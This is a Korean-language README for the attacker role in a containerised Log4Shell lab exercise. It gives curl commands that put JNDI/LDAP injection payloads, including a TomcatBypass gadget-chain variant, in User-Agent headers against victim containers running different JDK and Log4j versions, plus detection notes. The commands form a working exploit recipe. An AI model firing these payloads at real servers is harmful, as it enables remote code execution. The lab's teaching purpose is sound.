# 공격자(Attacker) — 담당 B (강현재)

Log4Shell 실습의 공격자 측. JNDIExploit 기반 LDAP + HTTP 서버로,
피해자에게 JNDI 페이로드를 보내 조건별 공격을 수행한다.

## 구성
- 공격자 컨테이너는 `docker-compose.yml`의 `attacker` 서비스로 정의되어 있어,
  `docker compose up -d` 시 피해자와 함께 자동 기동된다.
- 네트워크: `labnet` (internal) · 호스트명: `attacker`
- 성공 판정: 피해자 컨테이너에 `/tmp/success` 생성
  (명령 `touch /tmp/success`, base64 = `dG91Y2ggL3RtcC9zdWNjZXNz`)

## 실행
```
docker compose up -d      # 피해자 + 공격자 기동
docker logs attacker      # LDAP(1389)/HTTP(80) 리스닝 확인
```

## 조건별 공격
모두 `User-Agent` 헤더에 JNDI 페이로드를 넣어 전송한다.
(PowerShell · bash 공통 — 작은따옴표 그대로 유지, curl `-g`로 중괄호 글로빙 방지)

### 조건 ① — victim-v1 (구 JDK): 원격 클래스 로딩 RCE 성공
```
docker run --rm --network log4shell-lab_labnet curlimages/curl -s -g -H 'User-Agent: ${jndi:ldap://attacker:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9zdWNjZXNz}' http://victim-v1:8080/
docker compose exec victim-v1 ls -l /tmp/success     # 파일 생성 = 성공
```

### 조건 ② — victim-v2 (신 JDK): 원격 로딩 차단
```
docker compose exec victim-v2 rm -f /tmp/success     # 이전 흔적 제거
docker run --rm --network log4shell-lab_labnet curlimages/curl -s -g -H 'User-Agent: ${jndi:ldap://attacker:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9zdWNjZXNz}' http://victim-v2:8080/
docker compose exec victim-v2 ls -l /tmp/success     # No such file = 차단
```

### 조건 ③ — victim-v2 (신 JDK): 로컬 가젯 체인(TomcatBypass) 우회 성공
```
docker run --rm --network log4shell-lab_labnet curlimages/curl -s -g -H 'User-Agent: ${jndi:ldap://attacker:1389/TomcatBypass/Command/Base64/dG91Y2ggL3RtcC9zdWNjZXNz}' http://victim-v2:8080/
docker compose exec victim-v2 ls -l /tmp/success     # 파일 생성 = 우회 성공
```

### 조건 ④ — victim-v3 (패치 2.17.1): 완전 차단
```
docker run --rm --network log4shell-lab_labnet curlimages/curl -s -g -H 'User-Agent: ${jndi:ldap://attacker:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9zdWNjZXNz}' http://victim-v3:8080/
docker compose exec victim-v3 ls -l /tmp/success     # No such file (+ 공격자 로그에 질의 자체가 없음)
```

## 탐지(담당 C) 참고
- 공격자 측 LDAP 질의 수신은 `docker logs attacker`의 `Received LDAP Query`로 확인.
- 피해자 측 탐지 기준: 요청 로그의 `${jndi:ldap://...}` 패턴, 또는
  labnet 내부의 LDAP(1389) / HTTP(80) 트래픽(tcpdump).
- 조건별 기대 차이: ①③ 성공(/tmp/success 생성), ② 질의O·로딩X, ④ 질의 자체 없음.
